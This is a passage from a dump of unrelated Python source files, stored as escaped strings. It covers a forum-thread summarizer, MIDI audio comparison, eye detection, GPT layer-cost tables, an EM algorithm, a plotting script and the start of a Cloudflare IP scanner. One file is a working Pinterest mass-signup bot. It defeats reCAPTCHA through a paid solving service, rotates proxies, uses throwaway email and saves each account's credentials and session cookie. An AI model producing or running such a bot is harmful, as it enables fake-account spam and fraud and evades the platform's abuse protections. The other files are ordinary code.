handle_url(url,date_filter):\n\n    # 4chan\u7684URL\u5339\u914d\n    match_4chan = re.match(r'https?://boards\\.4chan\\.org/(\\w+)/thread/(\\d+)', url)\n    if match_4chan:\n        board  = match_4chan.group(1)\n        thread_id = match_4chan.group(2)\n        placeholder = st.empty()  # \u521b\u5efa\u4e00\u4e2a\u7a7a\u7684\u5360\u4f4d\u7b26\n        placeholder.text(f\"\u5df2\u8bc6\u522b\u52304chan{board}\u677f\u5757\u5e16\u5b50\uff0c\u4e32ID: {thread_id}\")  # \u663e\u793a\u4e34\u65f6\u6d88\u606f\n        params = {\"thread_id\":thread_id, \"board\":board}\n        return four_chan_scrape(thread_id,board), prompts[\"4chan\"], '4chan', params\n\n    # Stage1st\u7684URL\u5339\u914d\n    match_s1 = re.match(r'https?://(?:www\\.|bbs\\.)saraba1st\\.com/2b/thread-(\\d+)-\\d+-\\d+\\.html', url)\n    if match_s1:\n        thread_id = match_s1.group(1)\n        placeholder = st.empty()  # \u521b\u5efa\u4e00\u4e2a\u7a7a\u7684\u5360\u4f4d\u7b26\n        placeholder.text(f\"\u5df2\u8bc6\u522b\u5230Stage1st\u5e16\u5b50\uff0c\u5e16\u5b50ID: {thread_id}\")  # \u663e\u793a\u4e34\u65f6\u6d88\u606f\n        params = {\"thread_id\":thread_id}\n        return S1_scraper(thread_id), prompts[\"Stage1st\"], 's1', params\n    \n    # NGA\u7684URL\u5339\u914d\n    match_nga = re.match(r'https?://(?:bbs\\.nga\\.cn|nga\\.178\\.com|ngabbs\\.com)/read\\.php\\?tid=(\\d+)', url)\n    if match_nga:\n        thread_id = match_nga.group(1)  # \u63d0\u53d6\u5e16\u5b50ID\n        placeholder = st.empty()  # \u521b\u5efa\u4e00\u4e2a\u7a7a\u7684\u5360\u4f4d\u7b26\n        placeholder.text(f\"\u5df2\u8bc6\u522b\u5230NGA\u5e16\u5b50\uff0c\u5e16\u5b50ID: {thread_id}\")  # \u663e\u793a\u4e34\u65f6\u6d88\u606f\n        params = {\"thread_id\":thread_id}\n        return nga_scraper(thread_id,date_filter), prompts[\"NGA\"],'nga', params\n\n    # 5ch\u7684URL\u5339\u914d\n    match = re.match(r'https?://([^/]+)/test/read\\.cgi/([^/]+)/(\\d+)/?', url)\n    if match:\n        sever = match.group(1)\n        board = match.group(2)\n        thread_id = match.group(3)\n        placeholder = st.empty()  # \u521b\u5efa\u4e00\u4e2a\u7a7a\u7684\u5360\u4f4d\u7b26\n        placeholder.text(f\"\u5df2\u8bc6\u522b\u52305ch\u7c7b\u7f51\u5740\uff0c\u6765\u6e90{sever}\u7684{board}\u677f\u5757\uff0c\u4e32ID\uff1a{thread_id}\")  # \u6253\u5370\u8bc6\u522b\u7ed3\u679c\n        params = {\"sever\":sever, \"board\":board, \"thread_id\":thread_id}\n        # \u8c03\u7528fivechan_scraper\u51fd\u6570\n        return five_chan_scraper(sever, board, thread_id), prompts[\"5ch\"], '5ch', params\n\n    st.write(\"\u672a\u5339\u914d\u5230\u6b63\u786e\u5e16\u5b50\u94fe\u63a5.\")\n\nst.title(\"TL;DR\u2014\u2014\u4f60\u7684\u751f\u547d\u5f88\u5b9d\u8d35\")\nst.write(\"\u5f53\u524d\u7248\u672c v0.1.4 \u66f4\u65b0\u65e5\u671f\uff1a2024\u65e55\u670815\u65e5\")\n\nurl = st.text_input(r\"\u8bf7\u8f93\u51654Chan\\Stage1st\\NGA\\5ch\u7c7b\u5e16\u5b50\u94fe\u63a5:\", key=\"url_input\")\n\n# \u5217\u5e03\u5c40\ncol1, col2 = st.columns(2)\n\nwith col1:\n    # \u4e0b\u62c9\u9009\u62e9\u65f6\u95f4\u7b5b\u9009\u9009\u9879\n    date_filter_options = {\n        \"none\": \"\u4e0d\u8fc7\u6ee4\",\n        \"day\": \"\u8fc7\u53bb\u4e00\u5929\",\n        \"week\": \"\u8fc7\u53bb\u4e00\u5468\",\n        \"month\": \"\u8fc7\u53bb\u4e00\u6708\"\n    }\n    date_filter = st.selectbox(\n        \"\u9009\u62e9\u65f6\u95f4\u7b5b\u9009\u9009\u9879\uff1a\",\n        options=list(date_filter_options.keys()),\n        format_func=lambda x: date_filter_options[x]\n    )\n\nwith col2:\n    # \u5206\u6790\u6309\u94ae\n    if st.button(\"\u5f00\u59cb\u5206\u6790\"):\n        st.session_state['url'] = st.session_state['url_input'",
    "import os\nfrom midi2audio import FluidSynth\nimport soundfile as sf\n\ndef convert_midi_to_audio(midi_dir, audio_dir):\n    # \u521b\u5efa\u4e00\u4e2aFluidSynth\u5b9e\u4f8b\n    fs = FluidSynth()\n\n    # \u83b7\u53d6\u76ee\u5f55\u4e2d\u6240\u6709\u7684MIDI\u6587\u4ef6\n    midi_files = [f for f in os.listdir(midi_dir) if f.endswith('.midi') or f.endswith('.mid')]\n\n    # \u5c06\u6bcf\u4e2aMIDI\u6587\u4ef6\u8f6c\u6362\u4e3a\u97f3\u9891\n    for midi_file in midi_files:\n        # \u6784\u9020MIDI\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\n        midi_path = os.path.join(midi_dir, midi_file)\n\n        # \u6784\u9020\u8f93\u51fa\u97f3\u9891\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\n        audio_file = os.path.splitext(midi_file)[0] + '.wav'\n        audio_path = os.path.join(audio_dir, audio_file)\n\n        # \u5c06MIDI\u6587\u4ef6\u8f6c\u6362\u4e3a\u97f3\u9891\n        fs.midi_to_audio(midi_path, audio_path)\n\n        # \u6253\u5370\u6210\u529f\u6d88\u606f\n        print(f\"Successfully converted {midi_file} to {audio_file}\")\n\n# \u8bbe\u7f6e\u76ee\u5f55\nmidi_dir = '/root/autodl-tmp/midi-model-main/data/gen/2lc'  # MIDI\u6587\u4ef6\u7684\u8def\u5f84\naudio_dir = '/root/autodl-tmp/midi-model-main/data/gen/2lc'  # \u8bf7\u66ff\u6362\u4e3a\u4f60\u60f3\u8981\u4fdd\u5b58\u97f3\u9891\u6587\u4ef6\u7684\u8def\u5f84\n\n# \u8c03\u7528\u51fd\u6570\u5c06\u6240\u6709\u7684MIDI\u6587\u4ef6\u8f6c\u6362\u4e3a\u97f3\u9891\nconvert_midi_to_audio(midi_dir, audio_dir)\nimport os\nimport librosa\nimport numpy as np\nimport matplotlib.pyplot as plt\n\ndef plot_mfcc(mfccs,file):\n\n    # \u7ed8\u5236MFCC\u56fe\n    plt.figure(figsize=(10, 4))\n    librosa.display.specshow(mfccs, x_axis='time')\n    plt.colorbar()\n    plt.title('MFCC')\n    plt.tight_layout()\n\n    # \u4fdd\u5b58\u56fe\u50cf\n    plt.savefig(file)\ndef standardize_audio_files_length(audio_dir, target_length_sec):\n    #fs = FluidSynth()\n    # \u83b7\u53d6\u76ee\u5f55\u4e2d\u6240\u6709\u7684\u97f3\u9891\u6587\u4ef6\n    audio_files = [f for f in os.listdir(audio_dir) if f.endswith('.wav')]\n\n    # \u5c06\u6bcf\u4e2a\u97f3\u9891\u6587\u4ef6\u7684\u957f\u5ea6\u6807\u51c6\u5316\n    for audio_file in audio_files:\n        # \u6784\u9020\u97f3\u9891\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\n        audio_path = os.path.join(audio_dir, audio_file)\n\n        # \u52a0\u8f7d\u97f3\u9891\u6587\u4ef6\n        x , sr = librosa.load(audio_path)\n\n        # \u8bbe\u7f6e\u76ee\u6807\u957f\u5ea6\n        target_length = sr * target_length_sec  # target_length_sec\u79d2\n\n        # \u5982\u679c\u97f3\u9891\u592a\u957f\uff0c\u88c1\u526a\u5b83\n        if len(x) > target_length:\n            x = x[:target_length]\n\n        # \u5982\u679c\u97f3\u9891\u592a\u77ed\uff0c\u586b\u5145\u5b83\n        elif len(x) < target_length:\n            x = np.pad(x, (0, target_length - len(x)))\n\n        # \u786e\u4fddx\u7684\u957f\u5ea6\u7b49\u4e8etarget_length\n        assert len(x) == target_length\n        \n\n        # \u4fdd\u5b58\u97f3\u9891\n        sf.write(audio_path, x, sr)\n\n        # \u4fdd\u5b58\u6807\u51c6\u5316\u540e\u7684\u97f3\u9891\n        #librosa.output.write_wav(audio_path, x, sr)\n\n        # \u6253\u5370\u6210\u529f\u6d88\u606f\n        print(f\"Successfully standardized the length of {audio_file}\")\n        \nstandardize_audio_files_length(\"/root/autodl-tmp/midi-model-main/data/gen/2lc\", 30)\n#standardize_audio_files_length(\"/root/autodl-tmp/midi-model-main/gen\", 30)\n\nimport numpy as np\nimport librosa\nfrom scipy.special import rel_entr\n\ndef calculate_kl_divergence(audio_path1, audio_path2, n_mfcc=13, n_bins=30):\n    # \u52a0\u8f7d\u97f3\u9891\u6587\u4ef6\n    y1, sr1 = librosa.load(audio_path1)\n    y2, sr2 = librosa.load(audio_path2)\n\n    # \u63d0\u53d6MFCC\u7279\u5f81\n    mfcc1 = librosa.feature.mfcc(y=y1, sr=sr1, n_mfcc=n_mfcc)\n    plot_mfcc(mfcc1,\"mfcc1.png\")\n    mfcc2 = librosa.feature.mfcc(y=y2, sr=sr2, n_mfcc=n_mfcc)\n    plot_mfcc(mfcc2,\"mfcc2.png\")\n\n    # \u8ba1\u7b97MFCC\u7279\u5f81\u7684\u6982\u7387\u5206\u5e03\n    hist1, _ = np.histogram(mfcc1.flatten(), bins=n_bins, density=True)\n    hist2, _ = np.histogram(mfcc2.flatten(), bins=n_bins, density=True)\n\n    # \u8ba1\u7b97KL\u6563\u5ea6\n    kl_divergence = np.sum(rel_entr(hist1+1e-10, hist2+1e-10))\n\n    return kl_divergence\n\n# \u8c03\u7528\u51fd\u6570\u8ba1\u7b97KL\u6563\u5ea6\naudio_path1 = '/root/autodl-tmp/midi-model-main/data/gen/2lc/c.wav'  \naudio_path2 = '/root/autodl-tmp/midi-model-main/data/Val_ori/A Touch Of Blues - Bobby Blue Bland.wav'  \nkl_divergence1 = calculate_kl_divergence(audio_path1, audio_path2)\naudio_path1 = '/root/autodl-tmp/midi-model-main/data/gen/2lc/1.wav'  \n#audio_path2 = '/root/autodl-tmp/midi-model-main/data/Val_ori/9 To 5 - Dolly Parton.wav'  \nkl_divergence2 = calculate_kl_divergence(audio_path1, audio_path2)\naudio_path1 = '/root/autodl-tmp/midi-model-main/data/gen/2lc/output.wav'  \n#audio_path2 = '/root/autodl-tmp/midi-model-main/data/Val_ori/9 To 5 - Dolly Parton.wav'  \nkl_divergence3 = calculate_kl_divergence(audio_path1, audio_path2)\nprint(f\"The KL divergence avg of the midi prompt is: {(kl_divergence1+kl_divergence2+kl_divergence3)/3}\")\n",
    "import cv2\nimport numpy as np\n\n# Load the Haar Cascade files for face and eye detection\nface_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')\neye_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_eye.xml')\n\ndef detect_eyes(img, classifier):\n    gray_frame = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n    eyes = classifier.detectMultiScale(gray_frame, 1.3, 5)  # Detect eyes\n    for (ex, ey, ew, eh) in eyes:\n        cv2.rectangle(img, (ex, ey), (ex+ew, ey+eh), (0, 255, 0), 2)\n    return img, len(eyes)\n\ndef detect_face(img, classifier):\n    gray_frame = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n    faces = classifier.detectMultiScale(gray_frame, 1.3, 5)  # Detect the face\n    for (x, y, w, h) in faces:\n        cv2.rectangle(img, (x, y), (x+w, y+h), (255, 0, 0), 2)\n        roi_color = img[y:y+h, x:x+w]\n        roi_color, eyes_detected = detect_eyes(roi_color, eye_cascade)\n        if eyes_detected > 0:\n            print(\"Eyes open\")\n        else:\n            print(\"Eyes closed\")\n    return img\n\ncap = cv2.VideoCapture(0)\n\nwhile True:\n    ret, frame = cap.read()\n    if not ret:\n        break\n    frame = detect_face(frame, face_cascade)\n    cv2.imshow('Frame', frame)\n    if cv2.waitKey(1) & 0xFF == ord('q'):\n        break\n\ncap.release()\ncv2.destroyAllWindows()\n",
    "import numpy as np\n\n\nMB = 1024 * 1024\n\n# helper method\ndef parse_gpt_model():\n    params = []\n    fw_times, bw_times, opt_times = [], [], []\n    acts = []\n    with open('log.txt', 'r') as f:\n        idx = 0\n        for line in f.readlines():\n            if 'numel' in line:\n                params.append(int(line.split()[-1]))\n            elif 'time' in line:\n                fw = float(line.split(':')[1].split()[0])\n                bw = float(line.split(':')[2].split()[0])\n                act = max(0, int(line.split(':')[3].split()[0]))\n                fw_times.append(fw)\n                bw_times.append(bw)\n                acts.append(act)\n            elif 'step' in line:\n                step = float(line.split()[1]) / 10\n    total = sum(params[:-1])\n    print(f'forward: {sum(fw_times[:2]):.3f}, backward: {sum(bw_times[:2]):.3f}, optimizer: {step * params[0] / total:.3f}, acts: {sum(acts[:2])}, params: {params[0]}')\n    print(f'forward: {np.mean(fw_times[2:-3]):.3f}, backward: {np.mean(bw_times[2:-3]):.3f}, optimizer: {step * np.mean(params[1:-2]) / total:.3f}, acts: {np.mean(acts[2:-2]):.3f}, params: {np.mean(params[1:-2])}')\n    print(f'forward: {sum(fw_times[-3:]):.3f}, backward: {sum(bw_times[-3:]):.3f}, optimizer: {step * sum(params[-2:]) / total:.3f}, acts: {sum(acts[-3:])}, params: {sum(params[-2:])}')\n\n\ndef get_model_layer_costs(model, micro_batch_size, nlayers=1, seq_length=1024):\n    if model == 'gpt-2':\n        # model gpt-2, hidden_size: 1024, nheads: 16\n        if micro_batch_size == 2 and seq_length == 1024:\n            _profile = {\n                0: {\n                    'forward': 0.1659,\n                    'backward': 1.3790,\n                    'optimizer': 5.5431,\n                    'acts': 10485760 / MB, # MB\n                    'params': 42498048,\n                },\n                1: {\n                    'forward': 8.3165,\n                    'backward': 13.9290,\n                    'optimizer': 0.8212,\n                    'acts': 775979008 / MB, # MB\n                    'params': 12596224,\n                },\n                2: {\n                    'forward': 13.2382,\n                    'backward': 25.2204,\n                    'optimizer': 5.5493,\n                    'acts': 663192576 / MB, # MB\n                    'params': 42498048,\n                },\n            }\n        elif micro_batch_size == 4 and seq_length == 1024:\n            _profile = {\n                0: {\n                    'forward': 0.2577,\n                    'backward': 1.6028,\n                    'optimizer': 5.5431,\n                    'acts': 20971520 / MB, # MB\n                    'params': 42498048,\n                },\n                1: {\n                    'forward': 16.3985,\n                    'backward': 27.3141,\n                    'optimizer': 0.8212,\n                    'acts': 1551958016 / MB, # MB\n                    'params': 12596224,\n                },\n                2: {\n                    'forward': 26.4790,\n                    'backward': 50.8933,\n                    'optimizer': 5.5493,\n                    'acts': 1326384128 / MB, # MB\n                    'params': 42498048,\n                },\n            }\n        else:\n            raise NotImplementedError\n    elif model == 'gpt-1.5b':\n        if micro_batch_size == 1 and seq_length == 1024:\n            _profile = {\n                0: {\n                    'forward': 0.752,\n                    'backward': 0.798,\n                    'optimizer': 5.655,\n                    'acts': 9420800 / MB, # MB\n                    'params': 82124800,\n                },\n                1: {\n                    'forward': 6.510,\n                    'backward': 13.448,\n                    'optimizer': 2.117,\n                    'acts': 282034176 / MB, # MB\n                    'params': 30740800,\n                },\n                2: {\n                    'forward': 11.238,\n                    'backward': 23.762,\n                    'optimizer': 5.656,\n                    'acts': 186392576 / MB, # MB\n                    'params': 82128000,\n                },\n            }\n        elif micro_batch_size == 2 and seq_length == 1024:\n            _profile = {\n                0: {\n                    'forward': 0.620,\n                    'backward': 1.003,\n                    'optimizer': 5.655,\n                    'acts': 16793600 / MB, # MB\n                    'params': 82124800,\n                },\n                1: {\n                    'forward': 12.494,\n                    'backward': 26.396,\n                    'optimizer': 2.117,\n                    'acts': 557575606.857 / MB, # MB\n                    'params': 30740800,\n                },\n                2: {\n                    'forward': 22.440,\n                    'backward': 47.589,\n                    'optimizer': 5.656,\n                    'acts': 373817344 / MB, # MB\n                    'params': 82128000,\n                },\n            }\n        else:\n            raise NotImplementedError\n    ",
    "import json\r\nimport random\r\nimport threading\r\nimport time\r\n\r\nimport capsolver\r\nimport loguru\r\nimport requests\r\nimport modules.internxt as internxt\r\n\r\ncapsolver.api_key = json.loads(open(\"settings.json\",\"r\").read())[\"capsolver_key\"]\r\nclass P\u0131nterestGen:\r\n    def __init__(self):\r\n        self.session = requests.session()\r\n\r\n        self.session.headers = {\r\n            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',\r\n            'accept-language': 'tr-TR,tr;q=0.6',\r\n            'cache-control': 'no-cache',\r\n            'pragma': 'no-cache',\r\n            'sec-ch-ua': '\"Brave\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"',\r\n            'sec-ch-ua-mobile': '?0',\r\n            'sec-ch-ua-platform': '\"Windows\"',\r\n            'sec-fetch-dest': 'document',\r\n            'sec-fetch-mode': 'navigate',\r\n            'sec-fetch-site': 'none',\r\n            'sec-fetch-user': '?1',\r\n            'sec-gpc': '1',\r\n            'upgrade-insecure-requests': '1',\r\n            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',\r\n        }\r\n        self.internxtmailapi = internxt.Internxt()\r\n        self.email, self.emailToken = self.internxtmailapi.get_new_mail()\r\n        self.accountPassw = \"\".join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+=-') for i in range(10)])\r\n\r\n        proxy = random.choice(open(\"proxies.txt\").readlines()).strip()\r\n        self.session.proxies = {'http': 'http://' + proxy, 'https': 'http://' + proxy}\r\n\r\n\r\n    def get_csrf(self):\r\n        response = self.session.get('https://tr.pinterest.com/')\r\n        self.session.headers['x-csrftoken'] = response.cookies['csrftoken']\r\n        self.session.headers['x-pinterest-appstate'] = 'active'\r\n        self.session.headers['x-pinterest-pws-handler'] = 'www/index.js'\r\n        self.session.headers['x-pinterest-source-url'] = '/'\r\n        self.session.headers['x-requested-with'] = 'XMLHttpRequest'\r\n    def get_bday(self):\r\n        current_year = time.localtime().tm_year\r\n        random_years_ago = random.randint(18, 30)\r\n        selected_year = current_year - random_years_ago\r\n\r\n        start_time = time.mktime((selected_year, 1, 1, 0, 0, 0, 0, 0, 0))\r\n        end_time = time.mktime((selected_year + 1, 1, 1, 0, 0, 0, 0, 0, 0))\r\n\r\n        random_epoch = random.randint(int(start_time), int(end_time))\r\n        return random_epoch\r\n    def solve_recaptcha(self):\r\n        captcha_token = capsolver.solve(\r\n            {\r\n                \"type\": \"ReCaptchaV3EnterpriseTaskProxyless\",\r\n                \"websiteURL\": \"https://tr.pinterest.com\",\r\n                \"websiteKey\": \"6Ldx7ZkUAAAAAF3SZ05DRL2Kdh911tCa3qFP0-0r\",\r\n                \"apiDomain\": \"www.recaptcha.net\",\r\n                \"pageAction\": \"web_unauth\"\r\n            }\r\n        )[\"gRecaptchaResponse\"]\r\n        loguru.logger.info(f\"Captcha solved, {captcha_token[:50]}..\")\r\n        return captcha_token\r\n    def send_signup_req(self):\r\n        data = {\r\n            'source_url': '/',\r\n            'data': json.dumps({\"options\":{\"type\":\"email\",\"birthday\":int(self.get_bday()),\"email\":self.email,\"password\":self.accountPassw,\"country\":\"US\",\"first_name\":\"Alita\",\"last_name\":\"\",\"recaptchaV3Token\":self.solve_recaptcha(),\"visited_pages\":json.dumps([{\"path\":\"/\",\"pageType\":\"home\",\"ts\":int(str(time.time()).replace(\".\",\"\")[:13])}]),\"user_behavior_data\":\"{}\"},\"context\":{}})\r\n        }\r\n\r\n        response = self.session.post('https://tr.pinterest.com/resource/UserRegisterResource/create/',data=data)\r\n        if response.json()[\"resource_response\"][\"status\"] == \"success\":\r\n            loguru.logger.success(f\"[{self.email}] Account created successfully.\")\r\n\r\n        pinterest_sess_cookie = self.session.cookies[\"_pinterest_sess\"]\r\n\r\n        open(\"accounts.txt\",\"a\").write(f\"{self.email}:{self.accountPassw}:{pinterest_sess_cookie}\\n\")\r\n\r\ndef handle_tread():\r\n    while True:\r\n        pin = P\u0131nterestGen()\r\n        pin.get_csrf()\r\n        pin.send_signup_req()\r\n\r\nif __name__ == '__main__':\r\n    thread_count = input(\"how much thread? > \")\r\n    for i in range(int(thread_count)):\r\n        threading.Thread(target=handle_tread).start()",
    "import numpy as np\n\n\ndef gaussian_pdf(x, mean, var):\n    \"\"\" \u9ad8\u65af\u6982\u7387\u5bc6\u5ea6\u51fd\u6570 \"\"\"\n    return (1 / np.sqrt(2 * np.pi * var)) * np.exp(-((x - mean) ** 2) / (2 * var))\n\n\nclass EM:\n    def __init__(\n        self,\n        K: int = 2,\n        Mu: np.ndarray = None,\n        Sigma: np.ndarray = None,\n        Alpha: np.ndarray = None,\n        N: int = 0,\n        sample_data: np.ndarray = None,\n        max_iter_step: int = 1000,\n        epsilon: float = 0.001,\n        debug: bool = False\n    ):\n        # GMM\n        self.K = K                              # \u591a\u5c11\u4e2a\u9ad8\u65af\u5206\u5e03\n        self.Mu = Mu                            # \u7b2c k \u4e2a\u9ad8\u65af\u5206\u5e03\u7684\u521d\u59cb\u5747\u503c\n        self.Sigma = Sigma                      # \u7b2c k \u4e2a\u9ad8\u65af\u5206\u5e03\u7684\u521d\u59cb\u6807\u51c6\u5dee\n        self.Alpha = Alpha                      # \u7b2c k \u4e2a\u9ad8\u65af\u5206\u5e03\u7684\u5360\u6bd4\n\n        # Sample data\n        self.N = N                              # \u6837\u672c\u91cf\n        self.data = sample_data                 # \u6837\u672c\u6570\u636e\n        self.gamma = np.zeros((self.N, self.K)) # \u9690\u53d8\u91cf \u03b3\n\n        # train setting\n        self._max_iter_step = max_iter_step     # \u6700\u9ad8\u8fed\u4ee3\u6b21\u6570\n        self._threshold = epsilon               # \u8bef\u5dee\u9608\u503c\uff0c\u4f4e\u4e8e\u5219\u9000\u51fa\n        self._debug = debug                     # debug\n\n    def e_step(self):\n        \"\"\" E\u6b65\uff1a\u8865\u5168\u9690\u53d8\u91cf\u4fe1\u606f \"\"\"\n        for i in range(self.K):\n            self.gamma[:, i] = self.Alpha[i] * gaussian_pdf(self.data, self.Mu[i], self.Sigma[i])\n        self.gamma /= np.sum(self.gamma, axis=1, keepdims=True)\n\n    def m_step(self):\n        \"\"\" M\u6b65\uff1a\u66f4\u65b0\u9ad8\u65af\u5206\u5e03\u7684\u53c2\u6570\u548c\u6df7\u5408\u7cfb\u6570 \"\"\"\n        for i in range(self.K):\n            weight = np.sum(self.gamma[:, i])\n            self.Mu[i] = np.dot(self.gamma[:, i], self.data) / weight\n            self.Sigma[i] = np.dot(self.gamma[:, i], (self.data - self.Mu[i]) ** 2) / weight\n            self.Alpha[i] = weight / self.N\n\n    def run(self):\n        \"\"\" run EM algorithm \"\"\"\n        step = 0\n        for step in range(self._max_iter_step):\n            old_Mu = self.Mu.copy()\n            self.e_step()\n            self.m_step()\n\n            if np.linalg.norm(self.Mu - old_Mu) < self._threshold:\n                if self._debug: print(f\"Converged at iteration {step + 1}\")\n                break\n\n        # \u9650\u5b9a\u6b65\u6570\u5185\u672a\u6536\u655b\n        if self._debug and step + 1 == self._max_iter_step:\n            print(\"Reached maximum iterations without convergence.\")\n\n\nif __name__ == '__main__':\n    cur_K = 2\n    cur_Mu = np.array([0.25, 2.5])\n    cur_Sigma = np.array([0.125, 1.67])\n    cur_Alpha = np.array([0.5, 0.5])\n    cur_sample_data = np.array([0, 0.5, 1, 2, 3, 4])\n    cur_N = len(cur_sample_data)\n\n    em = EM(K=cur_K, Mu=cur_Mu, Sigma=cur_Sigma, Alpha=cur_Alpha, N=cur_N, sample_data=cur_sample_data, debug=True)\n    em.run()\n",
    "import numpy as np\nimport utils\nimport plot_utils\nimport argparse\n\nplot_utils.SetStyle()\n\ndef parse_arguments():\n    parser = argparse.ArgumentParser(description=\"Process and plot data based on the given dataset and configuration.\")\n    parser.add_argument(\"--dataset\", type=str, default=\"top\", help=\"Folder containing input files\")\n    parser.add_argument(\"--folder\", type=str, default=\"/pscratch/sd/v/vmikuni/PET/\", help=\"Folder containing input files\")\n    parser.add_argument(\"--plot_folder\", type=str, default=\"../plots\", help=\"Folder to save the outputs\")\n    parser.add_argument(\"--mode\", type=str, default=\"all\", help=\"Loss type to train the model: [all/classifier/generator]\")\n    parser.add_argument(\"--local\", action='store_true', help=\"Use local embedding\")\n    parser.add_argument(\"--num_layers\", type=int, default=8, help=\"Number of transformer layers\")\n    parser.add_argument(\"--simple\", action='store_true', help=\"Use simplified head model\")\n    parser.add_argument(\"--layer_scale\", action='store_true', help=\"Use layer scale in the residual connections\")\n    return parser.parse_args()\n\n\ndef compute_means(input_array, M):\n    # Ensure M is not zero to avoid division by zero\n    if M <= 0:\n        raise ValueError(\"M must be a positive integer\")\n\n    # Calculate the number of full chunks\n    N = len(input_array)\n    num_full_chunks = N // M\n\n    # Initialize the result list\n    result = []\n\n    # Compute the mean for each full chunk\n    for i in range(num_full_chunks):\n        chunk_mean = np.mean(input_array[i * M:(i + 1) * M])\n        result.append(chunk_mean)\n\n    # Handle the last chunk if there are remaining elements that do not make up a full chunk\n    remaining_elements = N % M\n    if remaining_elements != 0:\n        last_chunk_mean = np.mean(input_array[-remaining_elements:])\n        result.append(last_chunk_mean)\n\n    return np.array(result)\n\n\ndef load_and_plot_history(flags):\n\n    baseline_file = utils.get_model_name(flags,fine_tune=False)\n    ft_file = utils.get_model_name(flags,fine_tune=True)\n    if flags.dataset == 'omnifold':\n        baseline_file = f'{flags.folder}/histories/OmniFold_baseline_iter0_step1.pkl'\n        ft_file = f'{flags.folder}/histories/OmniFold_fine_tune_iter0_step1.pkl'\n            \n    history_baseline = utils.load_pickle(flags.folder, baseline_file)\n    history_ft = utils.load_pickle(flags.folder, ft_file)\n\n    if flags.mode == 'generator':        \n        loss_key = 'val_part'\n        nchunk = 10        \n    else:\n        loss_key = 'val_loss'\n        nchunk = 1\n        \n    plot_data = {\n        f'{flags.dataset}_fine_tune': compute_means(history_ft[loss_key][:],nchunk),\n        flags.dataset: compute_means(history_baseline[loss_key][:],nchunk),\n    }\n    fig, ax = plot_utils.PlotRoutine(plot_data, xlabel='Epochs' if loss_key == 'val_loss' else 'Epochs x 10', ylabel='Validation Loss', plot_min=True)\n    fig.savefig(f\"{flags.plot_folder}/loss_{flags.dataset}_{flags.mode}.pdf\", bbox_inches='tight')\n\ndef main():\n    flags = parse_arguments()\n    load_and_plot_history(flags)\n\nif __name__ == \"__main__\":\n    main()\n",
    "import sys , os  , re\r\nfrom concurrent.futures import ThreadPoolExecutor\r\nfrom functools import partial\r\nfrom pathlib import Path\r\nimport datetime  \r\nimport socket\r\nimport zipfile\r\nimport shutil\r\nimport http.client\r\nimport socket\r\nimport ssl\r\nimport time\r\n\r\nimport argparse\r\nimport geoip2.database\r\n\r\nclass Colors:\r\n    RESET = \"\\033[0m\"\r\n    RED = \"\\033[91m\"\r\n    GREEN = \"\\033[92m\"\r\n    YELLOW = \"\\033[93m\"\r\n    BLUE = \"\\033[94m\"\r\n    MAGENTA = \"\\033[95m\"\r\n    CYAN = \"\\033[96m\"\r\n    WHITE = \"\\033[97m\" \r\n\r\ntotale = 0\r\nsuccess = 0\r\nfail = 0\r\nzip_url = \"zip.baipiao.eu.org\"\r\nrequest_url = \"speed.cloudflare.com\"\r\nrequest_url_path = \"/cdn-cgi/trace\"\r\ntimeout = 4 \r\nno_test = False \r\nheaders = {\"user-agent\": \"Mozilla/5.0\"}\r\nenable_tls = True\r\nverbose = False\r\nmax_workers = 10\r\ncountry_names = []\r\ncountry_continent_names = []\r\n\r\ndatabase_file = Path(__file__).with_name('GeoLite2-Country.mmdb')\r\nasn_database_file = Path(__file__).with_name('GeoLite2-ASN.mmdb')\r\n\r\nscript_dir = Path(__file__).parent\r\nresult_dir_day = datetime.datetime.now().strftime('%Y-%m-%d')\r\ntimestamp = f\"{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}\"\r\nresult_folder = f\"{script_dir}\\\\Result\\\\{result_dir_day}\\\\{timestamp}\"\r\n\r\n\r\ndef save_to_file(data , country_name):\r\n    os.makedirs(result_folder, exist_ok=True)\r\n    result_file = os.path.join(result_folder, f\"{country_name}_{timestamp}.txt\")\r\n    with open(result_file, \"a\") as f :\r\n        f.writelines(f\"{data}\\n\")\r\n        f.close()\r\n\r\n\r\ndef banner():\r\n    banner = \"\"\"\r\n  \u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 -      -\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \r\n \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d -      -\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\r\n \u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551  \u2588\u2588\u2588\u2557-\u2588\u2588\u2588\u2588\u2588\u2557-\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\r\n \u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551   \u2588\u2588\u2551-\u255a\u2550\u2550\u2550\u2550\u255d-\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u255d \r\n \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551     \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d-      -\u2588\u2588\u2551\u2588\u2588\u2551     \r\n  \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d      